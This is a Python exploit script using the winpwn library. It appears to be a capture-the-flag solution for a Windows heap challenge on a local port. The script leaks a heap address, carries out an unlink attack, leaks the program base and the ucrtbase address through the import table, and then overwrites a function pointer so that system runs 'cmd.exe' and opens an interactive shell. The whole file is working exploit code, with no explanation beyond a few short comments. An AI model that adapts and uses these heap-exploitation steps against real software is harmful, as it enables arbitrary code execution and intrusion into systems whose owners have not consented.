#coding:utf8
from winpwn import *

sh = remote('127.0.0.1',2333)

def sendlineafter(a,b):
   sh.recvuntil(a)
   sh.sendline(b)

def sendafter(a,b):
   sh.recvuntil(a)
   sh.send(b)

sh.sendlineafter = sendlineafter;
sh.sendafter = sendafter

ucrtbase_exit = 0x3c1b0
ucrtbase_system = 0xb8320


def add(size):
   sh.sendlineafter('option >','1')
   sh.sendlineafter('size >',str(size))


def delete(index):
   sh.sendlineafter('option >','2')
   sh.sendlineafter('index >',str(index))


def show(index):
   sh.sendlineafter('option >','3')
   sh.sendlineafter('index >',str(index))


def edit(index,content):
   sh.sendlineafter('option >','4')
   sh.sendlineafter('index >',str(index))
   sh.sendafter('content  >',content)


add(0x90) #0
add(0x90) #1
add(0x90) #2
add(0) #3
add(0x10) #4
add(0) #5
add(0x10) #6


delete(0)
delete(5)
delete(3)
show(5)


sh.recvuntil('\n')
ans = sh.recvuntil('\r\n')[0:-2]
if len(ans) != 14:
   raise Exception('leak error')


addr = u32(ans[0:4])
heap_ptr0_addr = addr - 0x84
print 'heap_ptr0_addr=',hex(heap_ptr0_addr)

edit(0,p32(heap_ptr0_addr - 0x4) + p32(heap_ptr0_addr) + 'b\n')
#unlink
delete(1)
edit(0,p32(heap_ptr0_addr - 0x4) + p32(0) + p32(heap_ptr0_addr - 0x4) + '\n')
#泄露程序基址
show(0)
sh.recvuntil('\n')
exe_base = u32(sh.recvuntil('\r\n')[0:-2].ljust(4,'\x00')) - 0x104a
ucrtbase_exit_iat = exe_base + 0x20B0
print 'exe_base=',hex(exe_base)
#泄露iat表，得到ucrtbase地址
edit(1,p32(exe_base + 0x104a) + p32(ucrtbase_exit_iat) + '\n')
show(0)
sh.recvuntil('\n')
ucrtbase = u32(sh.recv(4)) - ucrtbase_exit
system_addr = ucrtbase + ucrtbase_system
print 'ucrtbase=',hex(ucrtbase)
print 'system_addr=',hex(system_addr)
#执行system("cnd.exe");
edit(1,p32(system_addr) + p32(heap_ptr0_addr + 0x4) + 'cmd.exe\n')
show(0)

sh.interactive()
